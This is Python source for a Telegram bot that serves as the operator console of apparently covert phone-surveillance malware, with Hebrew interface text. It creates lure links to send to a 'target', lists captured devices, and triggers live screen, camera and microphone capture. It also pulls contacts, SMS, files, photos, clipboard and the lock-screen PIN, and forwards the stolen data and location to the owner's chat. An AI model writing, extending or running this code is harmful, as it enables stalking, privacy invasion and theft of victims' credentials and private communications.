import asyncio, html, os, httpx
from telegram import Update, InlineKeyboardButton as B, InlineKeyboardMarkup as M
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

API = os.environ.get("API_BASE", "http://server:8000")
PUB = os.environ["PUBLIC_URL"].rstrip("/")
TOKEN = os.environ["BOT_TOKEN"]
ME = int(os.environ["OWNER_ID"])
H = {"x-token": os.environ["API_TOKEN"]}

LABEL = {"loc":"מיקום","ip":"IP","screen":"מסך חי","camf":"מצלמה קדמית","camb":"מצלמה אחורית",
         "mic":"מיקרופון","contacts":"אנשי קשר","sms":"SMS","files":"קבצים","apps":"אפליקציות",
         "photos":"תמונות","pin":"סיסמת נעילה","notif":"התראות","clip":"לוח עריכה"}

async def api(method, path, **kw):
    async with httpx.AsyncClient(timeout=25) as c:
        return await c.request(method, API + path, headers=H, **kw)

def ok(u: Update): return u.effective_user and u.effective_user.id == ME

def panel(dev, caps):
    rows, row = [], []
    for c in LABEL:
        if c not in caps: continue
        row.append(B(LABEL[c], callback_data=f"c:{c}:{dev}"))
        if len(row) == 2: rows.append(row); row = []
    if row: rows.append(row)
    rows.append([B("פתח צפייה חיה", callback_data=f"live:{dev}")])
    return M(rows)

async def start(u: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ok(u): return await u.message.reply_text("אין הרשאה")
    await u.message.reply_text("קונסולה פעילה.",
        reply_markup=M([[B("מכשירים", callback_data="list")], [B("קישור חדש", callback_data="link")]]))

async def lst(u, ctx):
    r = await api("GET", "/api/devices")
    ds = r.json()
    if not ds: return await u.message.reply_text("אין מכשירים.")
    rows = [[B(f"{d['model'] or d['platform']} · {'מחובר' if d['online'] else str(d['age'])+'ש'}",
               callback_data=f"d:{d['id']}")] for d in ds]
    await u.message.reply_text("בחר יעד:", reply_markup=M(rows))

async def route(u: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = u.callback_query; await q.answer()
    if not ok(u): return
    p = q.data.split(":")

    if p[0] == "list": return await lst(u, ctx)
    if p[0] == "link":
        r = await api("POST", "/api/link")
        return await q.message.reply_text(f"שלח ליעד:\n{PUB}/v/{r.json()['slug']}")

    dev = p[-1]
    if p[0] == "d":
        d = next((x for x in (await api("GET", "/api/devices")).json() if x["id"] == dev), None)
        if not d: return await q.message.reply_text("מכשיר לא נמצא")
        return await q.message.reply_text(
            f"<b>{html.escape(d['model'] or '?')}</b>\n{html.escape(d['os'] or '')}\nIP: {d['ip'] or '—'}",
            parse_mode="HTML", reply_markup=panel(dev, d["caps"]))

    if p[0] == "live":
        await api("POST", f"/api/cmd/{dev}", json={"cmd": "screen_on"})
        return await q.message.reply_text(f"{PUB}/live/{dev}")

    if p[0] == "c":
        r = await api("POST", f"/api/cmd/{dev}", json={"cmd": p[1]})
        return await q.message.reply_text("נשלח." if r.json().get("ok") else "המכשיר לא מחובר.")

async def poll(app: Application):
    since = 0.0
    while True:
        try:
            for e in (await api("GET", f"/api/events?since={since}")).json():
                since = max(since, e["ts"])
                await deliver(app, e)
        except Exception: pass
        await asyncio.sleep(3)

async def deliver(app, e):
    k, p, dev = e["kind"], __import__("json").loads(e["payload"] or "{}"), e["dev"]
    try:
        if k == "loc":
            txt = f"מיקום · ±{int(p.get('acc', 0))}מ\nhttps://maps.google.com/?q={p['lat']},{p['lon']}"
        elif k in ("ip", "clip", "apps", "files", "contacts", "sms", "pin", "notif"):
            txt = f"<b>{k}</b>\n<pre>{html.escape(str(p)[:3500])}</pre>"
        else: return
        await app.bot.send_message(ME, txt[:3900], parse_mode="HTML",
                                   disable_web_page_preview=True)
    except Exception: pass

async def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(route))
    async with app:
        await app.start()
        asyncio.create_task(poll(app))
        await app.updater.start_polling()
        await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
